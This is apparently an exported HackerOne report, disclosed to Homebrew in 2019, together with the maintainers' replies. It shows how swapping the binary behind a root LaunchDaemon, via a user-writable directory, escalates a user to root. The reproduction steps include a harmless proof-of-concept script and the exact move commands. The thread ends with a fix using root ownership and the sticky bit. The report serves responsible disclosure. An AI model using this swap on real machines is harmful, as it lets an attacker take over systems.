{"id":586251,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81ODYyNTE=","url":"https://hackerone.com/reports/586251","title":"Homebrew installed LaunchDaemons create simple root esclations","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-05-20T19:34:49.683Z","submitted_at":"2019-05-20T19:34:49.683Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"keeleysam","url":"/keeleysam","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":19399,"url":"https://hackerone.com/homebrew","handle":"homebrew","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/019/399/2f26b1d3c096d89ed989900225c128f670ab0ef0_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/399/2f26b1d3c096d89ed989900225c128f670ab0ef0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Homebrew","twitter_handle":"MacHomebrew","website":"https://brew.sh","about":"The missing package manager for macOS (and Linux)"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-05-24T16:36:52.595Z","bug_reporter_agreed_on_going_public_at":"2019-05-24T16:36:52.534Z","team_member_agreed_on_going_public_at":"2019-05-24T16:14:38.648Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Many programs installed via Homebrew require services to function as expected - most of the time these are LaunchAgents but sometimes they need to run as root via LaunchDaemons to function properly.  While Homebrew attempts to secure the executables run by the LaunchDaemons that it installs, any other program running as the user can easily swap out the program for a simple root escalation.\n\nReproduction steps:\n- In this case, we'll be looking at dnsmasq, but there are many others \n\n1. Install macOS Mojave 10.14.5, create an account and login.\n2. Install homebrew with the instructions on brew.sh.\n3. Run `brew install dnsmasq` - brew will tell the user to run `sudo brew services start dnsmasq`\n4. Run `sudo brew services start dnsmasq` as prompted.\n\n```\nsamuels-Mac:~ samuel$ sudo brew services start dnsmasq\nPassword:\n==\u003e Tapping homebrew/services\nCloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-services'...\nremote: Enumerating objects: 17, done.\nremote: Counting objects: 100% (17/17), done.\nremote: Compressing objects: 100% (14/14), done.\nremote: Total 17 (delta 0), reused 12 (delta 0), pack-reused 0\nUnpacking objects: 100% (17/17), done.\nTapped 1 command (50 files, 62.6KB).\n==\u003e Successfully started `dnsmasq` (label: homebrew.mxcl.dnsmasq)\n```\n5. We'll find a new LaunchDaemon has been created:\n\n```\nsamuels-Mac:~ samuel$ cat /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist \n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\u003e\n\u003cplist version=\"1.0\"\u003e\n  \u003cdict\u003e\n    \u003ckey\u003eLabel\u003c/key\u003e\n    \u003cstring\u003ehomebrew.mxcl.dnsmasq\u003c/string\u003e\n    \u003ckey\u003eProgramArguments\u003c/key\u003e\n    \u003carray\u003e\n      \u003cstring\u003e/usr/local/opt/dnsmasq/sbin/dnsmasq\u003c/string\u003e\n      \u003cstring\u003e--keep-in-foreground\u003c/string\u003e\n      \u003cstring\u003e-C\u003c/string\u003e\n      \u003cstring\u003e/usr/local/etc/dnsmasq.conf\u003c/string\u003e\n    \u003c/array\u003e\n    \u003ckey\u003eRunAtLoad\u003c/key\u003e\n    \u003ctrue/\u003e\n    \u003ckey\u003eKeepAlive\u003c/key\u003e\n    \u003ctrue/\u003e\n  \u003c/dict\u003e\n\u003c/plist\u003e\n```\n\n6. If we look at the folder `/usr/local/opt/dnsmasq/sbin` we can see that our user doesn't have write permissions on the `/usr/local/opt/dnsmasq/sbin/dnsmasq` program which the LaunchDaemon runs.  \n\n```\nsamuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin\ntotal 560\ndrwxr-xr-x   3 samuel  staff    96B Oct 18  2018 .\ndrwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..\n-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq\nsamuels-Mac:~ samuel$ echo \"\" \u003e\u003e /usr/local/opt/dnsmasq/sbin/dnsmasq \n-bash: /usr/local/opt/dnsmasq/sbin/dnsmasq: Permission denied\n```\n\n7. However, because our user _does_ have write permissions on the `/usr/local/opt/dnsmasq/sbin` directory, an attacker can move `/usr/local/opt/dnsmasq/sbin/dnsmasq` to the side and replace it with a different executable:\n\n```\nsamuels-Mac:~ samuel$ cat /tmp/evil.sh \n#!/bin/sh\n\ntouch /Library/evil\n\nexit 0\n\nsamuels-Mac:~ samuel$ ls -lah /tmp/evil.sh \n-rwxr-xr-x  1 samuel  wheel    40B May 20 12:30 /tmp/evil.sh\nsamuels-Mac:~ samuel$ mv /usr/local/opt/dnsmasq/sbin/dnsmasq /usr/local/opt/dnsmasq/sbin/dnsmasq.bak\nsamuels-Mac:~ samuel$ mv /tmp/evil.sh /usr/local/opt/dnsmasq/sbin/dnsmasq\nsamuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin/\ntotal 568\ndrwxr-xr-x   4 samuel  staff   128B May 20 12:31 .\ndrwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..\n-rwxr-xr-x   1 samuel  wheel    40B May 20 12:30 dnsmasq\n-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq.bak\nsamuels-Mac:~ samuel$ ls -lah /Library/evil\nls: /Library/evil: No such file or directory\n```\n\n8. Once the service relaunches for any reason (reboot of the Mac is most likely), root will execute the malicious executable.\n\n```\nsamuels-Mac:~ samuel$ ls -lah /Library/evil \n-rw-r--r--  1 root  wheel     0B May 20 12:34 /Library/evil\n```\n\n## Impact\n\nAny homebrew formula which prompts users to run `sudo brew services start` opens up this vulnerability.  \n\nOnce this is opened up, any attacker who can run code as the user can easily escalate to root.","vulnerability_information_html":"\u003cp\u003eMany programs installed via Homebrew require services to function as expected - most of the time these are LaunchAgents but sometimes they need to run as root via LaunchDaemons to function properly.  While Homebrew attempts to secure the executables run by the LaunchDaemons that it installs, any other program running as the user can easily swap out the program for a simple root escalation.\u003c/p\u003e\n\n\u003cp\u003eReproduction steps:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eIn this case, we\u0026#39;ll be looking at dnsmasq, but there are many others \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003col\u003e\n\u003cli\u003eInstall macOS Mojave 10.14.5, create an account and login.\u003c/li\u003e\n\u003cli\u003eInstall homebrew with the instructions on brew.sh.\u003c/li\u003e\n\u003cli\u003eRun \u003ccode\u003ebrew install dnsmasq\u003c/code\u003e - brew will tell the user to run \u003ccode\u003esudo brew services start dnsmasq\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eRun \u003ccode\u003esudo brew services start dnsmasq\u003c/code\u003e as prompted.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esamuels-Mac:~ samuel$ sudo brew services start dnsmasq\nPassword:\n==\u0026gt; Tapping homebrew/services\nCloning into \u0026#39;/usr/local/Homebrew/Library/Taps/homebrew/homebrew-services\u0026#39;...\nremote: Enumerating objects: 17, done.\nremote: Counting objects: 100% (17/17), done.\nremote: Compressing objects: 100% (14/14), done.\nremote: Total 17 (delta 0), reused 12 (delta 0), pack-reused 0\nUnpacking objects: 100% (17/17), done.\nTapped 1 command (50 files, 62.6KB).\n==\u0026gt; Successfully started `dnsmasq` (label: homebrew.mxcl.dnsmasq)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003eWe\u0026#39;ll find a new LaunchDaemon has been created:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esamuels-Mac:~ samuel$ cat /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist \n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\n\u0026lt;!DOCTYPE plist PUBLIC \u0026quot;-//Apple Computer//DTD PLIST 1.0//EN\u0026quot; \u0026quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026quot;\u0026gt;\n\u0026lt;plist version=\u0026quot;1.0\u0026quot;\u0026gt;\n  \u0026lt;dict\u0026gt;\n    \u0026lt;key\u0026gt;Label\u0026lt;/key\u0026gt;\n    \u0026lt;string\u0026gt;homebrew.mxcl.dnsmasq\u0026lt;/string\u0026gt;\n    \u0026lt;key\u0026gt;ProgramArguments\u0026lt;/key\u0026gt;\n    \u0026lt;array\u0026gt;\n      \u0026lt;string\u0026gt;/usr/local/opt/dnsmasq/sbin/dnsmasq\u0026lt;/string\u0026gt;\n      \u0026lt;string\u0026gt;--keep-in-foreground\u0026lt;/string\u0026gt;\n      \u0026lt;string\u0026gt;-C\u0026lt;/string\u0026gt;\n      \u0026lt;string\u0026gt;/usr/local/etc/dnsmasq.conf\u0026lt;/string\u0026gt;\n    \u0026lt;/array\u0026gt;\n    \u0026lt;key\u0026gt;RunAtLoad\u0026lt;/key\u0026gt;\n    \u0026lt;true/\u0026gt;\n    \u0026lt;key\u0026gt;KeepAlive\u0026lt;/key\u0026gt;\n    \u0026lt;true/\u0026gt;\n  \u0026lt;/dict\u0026gt;\n\u0026lt;/plist\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003eIf we look at the folder \u003ccode\u003e/usr/local/opt/dnsmasq/sbin\u003c/code\u003e we can see that our user doesn\u0026#39;t have write permissions on the \u003ccode\u003e/usr/local/opt/dnsmasq/sbin/dnsmasq\u003c/code\u003e program which the LaunchDaemon runs.\u003cbr\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esamuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin\ntotal 560\ndrwxr-xr-x   3 samuel  staff    96B Oct 18  2018 .\ndrwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..\n-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq\nsamuels-Mac:~ samuel$ echo \u0026quot;\u0026quot; \u0026gt;\u0026gt; /usr/local/opt/dnsmasq/sbin/dnsmasq \n-bash: /usr/local/opt/dnsmasq/sbin/dnsmasq: Permission denied\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003eHowever, because our user \u003cu\u003edoes\u003c/u\u003e have write permissions on the \u003ccode\u003e/usr/local/opt/dnsmasq/sbin\u003c/code\u003e directory, an attacker can move \u003ccode\u003e/usr/local/opt/dnsmasq/sbin/dnsmasq\u003c/code\u003e to the side and replace it with a different executable:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esamuels-Mac:~ samuel$ cat /tmp/evil.sh \n#!/bin/sh\n\ntouch /Library/evil\n\nexit 0\n\nsamuels-Mac:~ samuel$ ls -lah /tmp/evil.sh \n-rwxr-xr-x  1 samuel  wheel    40B May 20 12:30 /tmp/evil.sh\nsamuels-Mac:~ samuel$ mv /usr/local/opt/dnsmasq/sbin/dnsmasq /usr/local/opt/dnsmasq/sbin/dnsmasq.bak\nsamuels-Mac:~ samuel$ mv /tmp/evil.sh /usr/local/opt/dnsmasq/sbin/dnsmasq\nsamuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin/\ntotal 568\ndrwxr-xr-x   4 samuel  staff   128B May 20 12:31 .\ndrwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..\n-rwxr-xr-x   1 samuel  wheel    40B May 20 12:30 dnsmasq\n-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq.bak\nsamuels-Mac:~ samuel$ ls -lah /Library/evil\nls: /Library/evil: No such file or directory\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003eOnce the service relaunches for any reason (reboot of the Mac is most likely), root will execute the malicious executable.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esamuels-Mac:~ samuel$ ls -lah /Library/evil \n-rw-r--r--  1 root  wheel     0B May 20 12:34 /Library/evil\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAny homebrew formula which prompts users to run \u003ccode\u003esudo brew services start\u003c/code\u003e opens up this vulnerability.  \u003c/p\u003e\n\n\u003cp\u003eOnce this is opened up, any attacker who can run code as the user can easily escalate to root.\u003c/p\u003e\n","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-06-23T16:14:38.736Z","allow_singular_disclosure_after":-47916788.32966841,"singular_disclosure_allowed":true,"vote_count":8,"voters":["foobar7","x86scale","imran_nisar","mobius07","ninjajuju","cryptographer","hi_ztz","nexxius"],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4886992,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I don't see this as being particularly Homebrew-specific as it could apply to any plist for binaries running in user-writable locations. How would you see this being mitigated? Thanks!","markdown_message":"\u003cp\u003eI don\u0026#39;t see this as being particularly Homebrew-specific as it could apply to any plist for binaries running in user-writable locations. How would you see this being mitigated? Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-20T20:34:58.936Z","updated_at":"2019-05-20T20:34:58.936Z","actor":{"username":"mikemcquaid","cleared":false,"url":"/mikemcquaid","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/152/571/7d94225e54e75375692ed2bec7f21a63b1615ee4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"homebrew","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4887848,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It is true that this isn't really homebrew specific, and that the real fix here would be for launchd to not run anything which is user writable, but barring any changes on that side this is a hole that homebrew is opening up.\n\nTo mitigate, when Homebrew sets up a LaunchDaemon like this, it should ensure that what it points at is not mutable by the user without authentication.  This should probably be by ensuring that the directory is owned by root:wheel instead of user:staff, in this example `/usr/local/opt/dnsmasq/sbin`.  This would mean that updates to executable require authentication, but this is how it really should be.\n\nOtherwise, any of these homebrew LaunchDaemons are just places where arbitrary code can get run as root with very little effort.","markdown_message":"\u003cp\u003eIt is true that this isn\u0026#39;t really homebrew specific, and that the real fix here would be for launchd to not run anything which is user writable, but barring any changes on that side this is a hole that homebrew is opening up.\u003c/p\u003e\n\n\u003cp\u003eTo mitigate, when Homebrew sets up a LaunchDaemon like this, it should ensure that what it points at is not mutable by the user without authentication.  This should probably be by ensuring that the directory is owned by root:wheel instead of user:staff, in this example \u003ccode\u003e/usr/local/opt/dnsmasq/sbin\u003c/code\u003e.  This would mean that updates to executable require authentication, but this is how it really should be.\u003c/p\u003e\n\n\u003cp\u003eOtherwise, any of these homebrew LaunchDaemons are just places where arbitrary code can get run as root with very little effort.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-20T21:55:20.609Z","updated_at":"2019-05-20T21:55:20.609Z","actor":{"username":"keeleysam","cleared":false,"url":"/keeleysam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"homebrew","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4888206,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also I would presume that you already need to elevate permissions to unload and reload the launchdaemon for updates, so doing that to update the executable in the directory it is run from shouldn't be a compromise to user experience.","markdown_message":"\u003cp\u003eAlso I would presume that you already need to elevate permissions to unload and reload the launchdaemon for updates, so doing that to update the executable in the directory it is run from shouldn\u0026#39;t be a compromise to user experience.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-20T22:18:30.610Z","updated_at":"2019-05-20T22:18:30.610Z","actor":{"username":"keeleysam","cleared":false,"url":"/keeleysam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"homebrew","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4895310,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just to keep you in the loop: there's ongoing discussion with the Homebrew maintainers on how best to mitigate this (or at least better inform users of the risks). ","markdown_message":"\u003cp\u003eJust to keep you in the loop: there\u0026#39;s ongoing discussion with the Homebrew maintainers on how best to mitigate this (or at least better inform users of the risks). \u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-21T16:22:12.199Z","updated_at":"2019-05-21T16:22:12.199Z","actor":{"username":"mikemcquaid","cleared":false,"url":"/mikemcquaid","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/152/571/7d94225e54e75375692ed2bec7f21a63b1615ee4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"homebrew","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4911334,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've got a proof of concept up here: https://github.com/Homebrew/homebrew-services/compare/master...MikeMcQuaid:root-ownership\n\nThis will take ownership of the binary and `bin` or `sbin` directory and set the sticky bit on both. In my testing this prevents the replacement of these files.\n\nIf you consider this to resolve the issue I'll close and disclose.\n\nThanks again!","markdown_message":"\u003cp\u003eI\u0026#39;ve got a proof of concept up here: \u003ca title=\"https://github.com/Homebrew/homebrew-services/compare/master...MikeMcQuaid:root-ownership\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FHomebrew%2Fhomebrew-services%2Fcompare%2Fmaster...MikeMcQuaid%3Aroot-ownership\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Homebrew/homebrew-services/compare/master...MikeMcQuaid:root-ownership\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis will take ownership of the binary and \u003ccode\u003ebin\u003c/code\u003e or \u003ccode\u003esbin\u003c/code\u003e directory and set the sticky bit on both. In my testing this prevents the replacement of these files.\u003c/p\u003e\n\n\u003cp\u003eIf you consider this to resolve the issue I\u0026#39;ll close and disclose.\u003c/p\u003e\n\n\u003cp\u003eThanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-23T16:32:23.082Z","updated_at":"2019-05-23T16:32:23.082Z","actor":{"username":"mikemcquaid","cleared":false,"url":"/mikemcquaid","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/152/571/7d94225e54e75375692ed2bec7f21a63b1615ee4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"homebrew","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4911866,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This looks reasonable to me - this is a nifty use of the sticky bit.\n\nSam","markdown_message":"\u003cp\u003eThis looks reasonable to me - this is a nifty use of the sticky bit.\u003c/p\u003e\n\n\u003cp\u003eSam\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-23T17:59:35.680Z","updated_at":"2019-05-23T17:59:35.680Z","actor":{"username":"keeleysam","cleared":false,"url":"/keeleysam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"homebrew","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4918503,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-24T16:14:02.754Z","updated_at":"2019-05-24T16:14:02.754Z","actor":{"username":"mikemcquaid","cleared":false,"url":"/mikemcquaid","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/152/571/7d94225e54e75375692ed2bec7f21a63b1615ee4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"keeleysam","url":"/keeleysam"},"genius_execution_id":null,"team_handle":"homebrew","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4918504,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great work, thanks again!","markdown_message":"\u003cp\u003eGreat work, thanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-24T16:14:31.136Z","updated_at":"2019-05-24T16:14:31.136Z","actor":{"username":"mikemcquaid","cleared":false,"url":"/mikemcquaid","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/152/571/7d94225e54e75375692ed2bec7f21a63b1615ee4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"homebrew","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4918506,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-24T16:14:38.676Z","updated_at":"2019-05-24T16:14:38.676Z","first_to_agree":true,"actor":{"username":"mikemcquaid","cleared":false,"url":"/mikemcquaid","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/152/571/7d94225e54e75375692ed2bec7f21a63b1615ee4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"homebrew","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4918611,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-24T16:36:52.556Z","updated_at":"2019-05-24T16:36:52.556Z","actor":{"username":"keeleysam","cleared":false,"url":"/keeleysam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"homebrew","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4918612,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-05-24T16:36:52.616Z","updated_at":"2019-05-24T16:36:52.616Z","actor":{"username":"keeleysam","cleared":false,"url":"/keeleysam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"homebrew","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}